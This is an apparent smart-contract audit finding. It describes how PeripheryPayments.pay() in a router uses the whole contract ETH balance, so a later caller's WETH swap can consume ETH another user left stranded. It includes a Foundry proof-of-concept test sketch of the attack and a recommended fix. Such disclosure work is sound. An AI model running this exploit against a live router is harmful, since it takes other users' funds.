### Title
Leftover ETH from Prior User Subsidizes Attacker's WETH Swap via Unattributed `address(this).balance` in `PeripheryPayments.pay()` - (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses `address(this).balance` — the router's **total** native ETH balance — as the ETH contribution toward a WETH payment. There is no per-transaction attribution. Any ETH left on the router from a prior user's unclaimed refund is silently consumed to subsidize the next caller's WETH swap input, causing direct loss of the prior user's ETH principal.

---

### Finding Description

The partial-ETH branch of `pay()` reads the router's entire native balance: [1](#0-0) 

```solidity
uint256 nativeBalance = address(this).balance;   // entire router balance, not msg.value
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
} else if (nativeBalance > 0) {                  // partial-ETH branch
    IWETH9(WETH).deposit{value: nativeBalance}();
    IERC20(WETH).safeTransfer(recipient, nativeBalance);
    IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
}
```

ETH accumulates on the router whenever a user calls `multicall{value: X}(...)` and omits `refundETH`. The `receive()` guard only blocks direct `call{value}` transfers from non-WETH addresses; it does **not** prevent `msg.value` from accumulating via payable function calls like `multicall`. [2](#0-1) 

The router has no per-transaction ETH accounting. Once ETH is stranded, any subsequent `pay()` call with `token == WETH` and `0 < address(this).balance < value` will consume that stranded ETH.

The callback path that reaches `pay()` is: [3](#0-2) 

`exactInputSingle` → pool callback → `_justPayCallback` → `pay(tokenIn, msg.sender_of_swap, pool, amountIn)`.

---

### Impact Explanation

**Direct loss of prior user's ETH principal.** User A's stranded ETH is wrapped into WETH and transferred to the pool as part of Attacker B's swap input. User A's ETH is permanently consumed; B's required WETH approval is reduced by exactly `address(this).balance` at the time of B's swap. The pool receives the correct total, so no pool-side check catches this. User A has no recourse once the ETH is consumed.

This meets the Critical/High threshold: direct loss of user principal with no protocol-side guard.

---

### Likelihood Explanation

The precondition — ETH stranded on the router — is a normal operational state. The intended usage pattern is `multicall{value}([swap, refundETH])`, but omitting `refundETH` is a common user mistake and is not enforced by the router. Any attacker monitoring the mempool or router balance can exploit this immediately in the next block after ETH is stranded. [4](#0-3) 

---

### Recommendation

Track only the ETH that belongs to the **current transaction** rather than the entire router balance. The standard approach is to pass `msg.value` through to `pay()` and use only that amount as the native contribution:

```solidity
// In exactInputSingle / exactInput / exactOutputSingle / exactOutput:
_setNextCallbackContext(..., msg.value);   // store msg.value in transient storage

// In pay():
uint256 nativeContribution = _getMsgValue();  // read from transient, not address(this).balance
if (nativeContribution >= value) { ... }
else if (nativeContribution > 0) { ... }
```

Alternatively, after each swap entry-point completes, assert `address(this).balance == 0` (or refund any remainder automatically), so ETH can never be stranded across transaction boundaries.

### Proof of Concept

```solidity
// Foundry integration test sketch
function test_strandedEthSubsidizesAttacker() public {
    uint256 amountIn = 1_000;

    // Step 1: User A sends excess ETH via multicall, omits refundETH
    bytes[] memory callsA = new bytes[](1);
    callsA[0] = abi.encodeCall(router.exactInputSingle, (ExactInputSingleParams({
        pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
        zeroForOne: true, amountIn: uint128(amountIn / 2),
        amountOutMinimum: 0, recipient: userA, deadline: block.timestamp + 1,
        priceLimitX64: 0, extensionData: ""
    })));
    vm.prank(userA);
    router.multicall{value: amountIn}(callsA);  // sends 1000 wei, uses 500, leaves 500 on router

    uint256 routerEthAfterA = address(router).balance;
    assertEq(routerEthAfterA, amountIn / 2, "500 wei stranded");

    // Step 2: Attacker B approves only (amountIn - routerEthAfterA) WETH
    weth.mint(attacker, amountIn - routerEthAfterA);
    vm.prank(attacker);
    weth.approve(address(router), amountIn - routerEthAfterA);

    // Step 3: Attacker B swaps amountIn=1000 with only 500 WETH approved
    vm.prank(attacker);
    router.exactInputSingle(ExactInputSingleParams({
        pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
        zeroForOne: true, amountIn: uint128(amountIn),
        amountOutMinimum: 0, recipient: attacker, deadline: block.timestamp + 1,
        priceLimitX64: 0, extensionData: ""
    }));

    // Assertions: router ETH is zero (User A's ETH consumed), attacker got full swap output
    assertEq(address(router).balance, 0, "User A's ETH consumed by attacker's swap");
    assertEq(weth.balanceOf(attacker), 0, "attacker spent only 500 WETH");
}
```

User A's 500 wei is consumed at line 79-80 of `PeripheryPayments.sol` during Attacker B's callback, reducing B's required WETH pull from 1000 to 500. [5](#0-4)
